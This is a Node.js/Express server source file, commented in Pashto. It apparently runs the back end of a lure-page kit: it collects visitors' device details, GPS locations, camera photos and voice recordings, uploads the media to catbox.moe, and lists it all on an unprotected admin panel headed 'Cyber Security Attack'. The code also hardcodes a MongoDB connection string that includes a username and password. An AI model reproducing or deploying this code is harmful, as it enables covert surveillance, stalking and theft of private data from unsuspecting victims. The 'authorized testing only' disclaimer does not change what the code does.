const express = require('express');
const multer = require('multer');
const mongoose = require('mongoose');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// دلته خپل د MongoDB Connection String ولیکئ
const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://kingofface20_db_user:7vALcITSPX1k04S3@cluster0.9xmnxrs.mongodb.net/?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
.then(() => console.log('✅ Connected to MongoDB Atlas'))
.catch(err => console.error('❌ MongoDB Connection Error:', err));

const deviceInfoSchema = new mongoose.Schema({ time: String, ip: String, info: String });
const DeviceInfo = mongoose.model('DeviceInfo', deviceInfoSchema);

const locationSchema = new mongoose.Schema({ time: String, ip: String, latitude: Number, longitude: Number });
const LocationData = mongoose.model('LocationData', locationSchema);

const linkSchema = new mongoose.Schema({ type: String, url: String, time: String });
const LinkData = mongoose.model('LinkData', linkSchema);

app.set('trust proxy', true);
const upload = multer({ storage: multer.memoryStorage() });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- پخواني او نوي مسیرونه (سکتورونه) ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/page1', (req, res) => {
    res.sendFile(path.join(__dirname, 'index2.html'));
});

app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, 'index3.html'));
});

app.get('/page4', (req, res) => {
    res.sendFile(path.join(__dirname, 'index4.html'));
});

app.get('/page5', (req, res) => {
    res.sendFile(path.join(__dirname, 'index5.html'));
});

app.get('/page6', (req, res) => {
    res.sendFile(path.join(__dirname, 'index6.html'));
});

app.get('/page7', (req, res) => {
    res.sendFile(path.join(__dirname, 'index7.html'));
});

app.get('/page8', (req, res) => {
    res.sendFile(path.join(__dirname, 'index8.html'));
});

app.get('/page9', (req, res) => {
    res.sendFile(path.join(__dirname, 'index9.html'));
});

// Catbox ته د فایل د اپلوډ کولو فنکشن
async function uploadToCatbox(buffer, filename) {
    try {
        const formData = new FormData();
        formData.append('reqtype', 'fileupload');
        formData.append('fileToUpload', buffer, { filename: filename });

        const response = await axios.post('https://catbox.moe/user/api.php', formData, {
            headers: formData.getHeaders(),
            timeout: 20000
        });
        return response.data;
    } catch (error) {
        console.error('Catbox upload error:', error.message);
        return null;
    }
}

// د پوسټ ریکویسټونو لارې د ټولو پاڼو لپاره
app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    handleIncomingData(req, res);
});

app.post('/page3', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    handleIncomingData(req, res);
});

app.post('/page4', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    handleIncomingData(req, res);
});

app.post('/page5', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    handleIncomingData(req, res);
});

app.post('/page6', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    handleIncomingData(req, res);
});

app.post('/page7', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    handleIncomingData(req, res);
});

app.post('/page8', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    handleIncomingData(req, res);
});

app.post('/page9', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
    handleIncomingData(req, res);
});

// عمومي فنکشن د ډېټا د پروسس او ذخیره کولو لپاره
async function handleIncomingData(req, res) {
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
    if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') clientIp = '127.0.0.1 (Localhost)';

    const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');

    if (req.body.device_info) {
        try {
            const info = JSON.parse(req.body.device_info);
            const entryText = `📅 نېټه: ${time}\n🌐 آی‌پي: ${clientIp}\n📱 برانډ: ${info.deviceType}\n🔢 انډرایډ/اوس: ${info.androidVer}\n📐 سکرین: ${info.screenSize}\n🔋 بیټرۍ: ${info.batteryLevel}\n🌐 ژبه: ${info.language}\n-----------------------------------`;
            await DeviceInfo.create({ time, ip: clientIp, info: entryText });
            return res.send("Device Info Saved");
        } catch (e) {}
    }

    if (req.body.latitude && req.body.longitude) {
        const lat = parseFloat(req.body.latitude);
        const lng = parseFloat(req.body.longitude);
        if (!isNaN(lat) && !isNaN(lng)) {
            await LocationData.create({ time, ip: clientIp, latitude: lat, longitude: lng });
            return res.send("Location Saved");
        }
    }

    if (req.files && req.files.photo) {
        const file = req.files.photo[0];
        const onlineUrl = await uploadToCatbox(file.buffer, `photo_${Date.now()}.jpg`);
        if (onlineUrl) {
            await LinkData.create({ type: 'photo', url: onlineUrl, time });
            return res.send("Photo Saved");
        }
    }

    if (req.files && req.files.voice) {
        const file = req.files.voice[0];
        const onlineUrl = await uploadToCatbox(file.buffer, `voice_${Date.now()}.ogg`);
        if (onlineUrl) {
            await LinkData.create({ type: 'voice', url: onlineUrl, time });
            return res.send("Voice Saved");
        }
    }

    res.status(400).send("Bad Request");
}

// د اډمین پاڼه
app.get('/admin', async (req, res) => {
    const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';

    if (req.query.action === 'enter') {
        res.setHeader('Set-Cookie', 'welcome=true; Path=/');
        return res.redirect('/admin');
    }

    if (req.query.delete) {
        const target = req.query.delete;
        if (target === 'locations') await LocationData.deleteMany({});
        else if (target === 'device_info') await DeviceInfo.deleteMany({});
        else if (target === 'all_photos') await LinkData.deleteMany({ type: 'photo' });
        else if (target === 'all_voices') await LinkData.deleteMany({ type: 'voice' });
        return res.redirect('/admin');
    }

    const devices = await DeviceInfo.find().sort({ _id: -1 });
    const locations = await LocationData.find().sort({ _id: -1 });
    const photos = await LinkData.find({ type: 'photo' }).sort({ _id: -1 });
    const voices = await LinkData.find({ type: 'voice' }).sort({ _id: -1 });

    let deviceInfoHtml = devices.length ? `<pre style="white-space: pre-wrap; font-size: 14px; color: #111; background: #fafafa; padding: 12px; border-radius: 6px; max-height: 250px; overflow-y: auto; font-family: monospace; line-height: 1.5;">${devices.map(d => d.info).join('\n')}</pre>` : '<p>تاسې تر اوسه د موبایل کوم معلومات نه دي ترلاسه کړي.</p>';
    let deleteDevBtn = devices.length ? `<a href="/admin?delete=device_info" class="delete-btn" onclick="return confirm('ټول معلومات پاک شي؟')">ټول پاکول</a>` : '';

    let locationsHtml = locations.length ? locations.map(loc => `<div class="map-container"><iframe width="100%" height="150" frameborder="0" scrolling="no" src="https://maps.google.com/maps?q=${loc.latitude},${loc.longitude}&z=15&output=embed"></iframe></div>`).join('') : '<p>تر اوسه کوم لوکیشن نه دی ثبت شوی.</p>';
    let deleteLocBtn = locations.length ? `<a href="/admin?delete=locations" class="delete-btn" onclick="return confirm('ټول لوکیشنونه پاک شي؟')">ټول پاکول</a>` : '';

    let photosHtml = photos.length ? photos.map(p => `<div class="item-box"><a href="${p.url}" target='_blank'><img src="${p.url}" alt='Photo'></a></div>`).join('') : "<p style='grid-column: span 3; text-align: center;'>کوم عکس نشته.</p>";
    let deleteAllPhotosBtn = photos.length ? `<a href="/admin?delete=all_photos" class="delete-btn" onclick="return confirm('ټول عکسونه پاک شي؟')">ټول پاکول</a>` : '';

    let voicesHtml = voices.length ? voices.map(v => `<div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'><audio controls src="${v.url}"></audio></div>`).join('') : "<p>کوم غږیز ریکارډ تر اوسه نشته.</p>";
    let deleteAllVoicesBtn = voices.length ? `<a href="/admin?delete=all_voices" class="delete-btn" onclick="return confirm('ټول غږونه پاک شي؟')">ټول پاکول</a>` : '';

    let html = `
    <!DOCTYPE html>
    <html lang="ps">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>د اډمین پینل - راټول شوي معلومات</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 10px; margin: 0; direction: rtl; text-align: right; }
            .welcome-card { background: white; border-radius: 12px; padding: 20px; max-width: 500px; margin: 30px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.15); text-align: center; }
            .welcome-card img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; margin-bottom: 15px; }
            .welcome-title { color: #111; font-size: 20px; margin-bottom: 10px; border-bottom: 2px solid #25D366; padding-bottom: 8px; }
            .welcome-msg { color: #333; font-size: 14px; line-height: 1.8; text-align: justify; background: #f9f9f9; padding: 12px; border-radius: 6px; border-right: 4px solid #ff4d4d; margin-bottom: 20px; }
            .enter-btn { background-color: #25D366; color: white; padding: 12px 25px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 16px; display: inline-block; }
            h2 { color: #111; border-bottom: 2px solid #25D366; padding-bottom: 6px; margin-top: 15px; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
            .card { background: white; border-radius: 8px; padding: 10px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
            .item-box { position: relative; border: 1px solid #ddd; border-radius: 4px; overflow: hidden; background: #fff; padding: 4px; text-align: center; }
            .grid img { width: 100%; height: 90px; object-fit: cover; border-radius: 3px; }
            .map-container { margin-bottom: 10px; border-radius: 6px; overflow: hidden; border: 1px solid #ddd; }
            audio { width: 100%; margin-top: 5px; height: 35px; }
            .delete-btn { background-color: #ff4d4d; color: white; border: none; padding: 3px 6px; border-radius: 3px; cursor: pointer; font-size: 11px; text-decoration: none; display: inline-block; margin-top: 4px; }
            p { color: #667781; font-size: 14px; }
        </style>
    </head>
    <body>`;

    if (showWelcome) {
        html += `
        <div class="welcome-card">
            <img src="https://files.catbox.moe/4dzyf1.jpg" alt="Welcome Image">
            <div class="welcome-title">🛡️ Welcome to Cyber Security Attack ⚡</div>
            <p style="text-align: center; font-weight: bold; color: #25D366; margin: 5px 0;">🔰 د برنامې هرکلی!</p>
            <div class="welcome-msg">
                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو لپاره دی.<br><br>
                👨‍💻 <strong>درنښت، اډمین:</strong> @Mastershahzada
            </div>
            <a href="/admin?action=enter" class="enter-btn">سیستم ته ننوتل 🚀</a>
        </div>`;
    } else {
        html += `
        <h2>📱 د موبایل او سیسټم معلومات: ${deleteDevBtn}</h2>
        <div class="card">${deviceInfoHtml}</div>

        <h2>📍 راټول شوي لوکیشنونه: ${deleteLocBtn}</h2>
        <div class="card">${locationsHtml}</div>

        <h2>📸 اخیستل شوي عکسونه: ${deleteAllPhotosBtn}</h2>
        <div class="card grid">${photosHtml}</div>

        <h2>🎙️ ریکارډ شوي غږونه: ${deleteAllVoicesBtn}</h2>
        <div class="card">${voicesHtml}</div>`;
    }

    html += `</body></html>`;
    res.send(html);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
